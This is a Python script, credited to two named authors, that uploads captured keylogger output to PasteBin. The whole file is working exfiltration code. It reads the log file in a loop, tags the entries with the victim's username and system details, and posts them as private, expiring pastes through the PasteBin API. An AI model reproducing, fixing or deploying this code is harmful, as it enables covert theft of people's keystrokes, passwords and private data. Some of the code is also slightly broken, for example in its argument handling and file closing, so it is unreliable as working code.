'''
Script to Exfiltrade all data to PasteBin from keyLogger.
Yonatan Orozko & Ilona Geftner

'''
#Imports
import sys, getopt
from dotenv import load_dotenv
from os import environ as en
from os.path import exists
from os import uname
import getpass
import pastebin
import datetime;
from time import sleep
import json  


# Define API & connect to pastebin
def get_pastebin_api():
    
    load_dotenv()
    api_dev_key = en['API_DEV_KEY']
    username = en['P_USERNAME']
    password = en['P_PASSWORD']
    api_user_key = None
    if api_user_key:
        api = pastebin.PasteBin(api_dev_key, api_user_key)
    else:
        api = pastebin.PasteBin(api_dev_key)
        api_user_key = api.create_user_key(username, password)
        if 'Bad API request' not in api_user_key:
            #print('[+] - You API user key is: ' + api_user_key)
            api = pastebin.PasteBin(api_dev_key, api_user_key)
        else:
            api = None
            raise SystemExit('[!] - Failed to create API user key! ({0})'.format(api_user_key.split(', ')[1]))
    return(api)
            
#Check fill buffer to send.
def fill_buffer_upload(myInode, uploadInterval):
    ct = datetime.datetime.now()
    bufferToUp = {getpass.getuser():("Victim details: {}".format(uname()))}
    try:
        api = get_pastebin_api()
    except Exception as e:
        print(e)
    try:
        f = open(myInode)
            
    except Exception as e:
        print(e)
    while exists(myInode):
        sleep(uploadInterval)
        bufferToUp[ct]= f.read()
        if(sys.getsizeof(bufferToUp)>1000):
            data = json.dumps(bufferToUp)
            result = api.paste(data, guest=True, name="Logs for: {}".format(getpass.getuser()), format='json', private='1', expire='10M')
            if 'Bad API request' not in result:
                print('[+] - PasteBin URL: ' + result)
                bufferToUp.clear()
            else:
                raise SystemExit('[!] - Failed to create paste! ({0})'.format(api_user_key.split(', ')[1]))
                
            
        
        
    f.close
    # Create a Paste\
    
        
    
#Exfiltrade data to Pastebin every min




def main():
    time_to_upload = None
    file_inode = None
    argv = sys.argv[1:]
    try:
        opts, args = getopt.getopt(argv, "p:t:f:")
     
    except:
        print('''This script will upload to pastebin data every 30 when data is bigger than 1000bytes evey -t seconds''')
    
    for opt, arg in opts:
        if opt in ['-f']:
            file_inode = arg
        elif opt in ['-t']:
            time_to_upload = arg
        else:
            print(" USE: python log_sender.py -f <file_name> -t <time to upload>")
    try:
        fill_buffer_upload(file_inode,time_to_upload)
        
    except Exception as e:
        print(e)
    



if __name__ == "__main__":
    main()